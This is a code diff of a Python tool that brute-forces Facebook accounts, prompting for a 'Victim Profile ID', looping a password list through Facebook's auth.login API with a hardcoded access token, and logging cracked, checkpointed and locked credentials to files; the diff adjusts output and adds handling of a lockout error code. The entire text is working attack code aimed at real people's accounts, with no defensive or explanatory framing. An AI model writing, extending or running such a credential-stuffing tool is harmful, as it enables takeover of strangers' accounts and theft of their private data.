@@ -106,6 +106,7 @@ while True:
         os.system("clear")
 
 os.system("clear")
+
 print(logo)
 motion(info)
 victim = raw_input(ccl+"\nEnter Victim Profile ID >> ")
@@ -116,7 +117,7 @@ word = open(passlist,'r').readlines()
 
 with open(fil, 'r')as file:
   x = len(file.readlines())
-  motion(rcl+'\nTotal Password =>> '+str(x))
+  motion(rcl+'\nTotal Password =>> '+str(x)+'\n')
   
   
 
@@ -139,20 +140,25 @@ def Noob():
      
       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +victim+ '&locale=en_US&password=' +line+ '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
       q = json.load(data)
-      
+      #print(q)
       if 'access_token' in q:
-        motion (ccl+'\n[NOOB_OK] ' + victim + '  |  ' + line+"\n")
+        motion (ccl+'[NOOB_OK] ' + victim + '  |  ' + line+"\n")
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
                   
       elif 'www.facebook.com' in q['error_msg']:
-        motion( ycl+'\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
+        motion( ycl+'[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
         cps = open('save/Noob_CheckPoint.txt', 'a')
         cps.write(victim +" [ NOOB ] "+ line + '\n')
         cps.close()
+      elif q['error_code']  == "613" or q['error_code']  == 613:
+        motion('\n[ LOCKED ] ' +victim+'  |  ' + line+"\n")
+        okb = open('save/Noob_Successful.txt', 'a')
+        okb.write(victim +" [ NOOB ] "+ line + '\n')
+        okb.close()
       else:
-        print( ycl+'[ PASSWORD WRONG ] '  +ycl + line)
+        print( ycl+'[ PASSWORD WRONG ] '  +ycl + line+'\n')
     except:
       pass
   
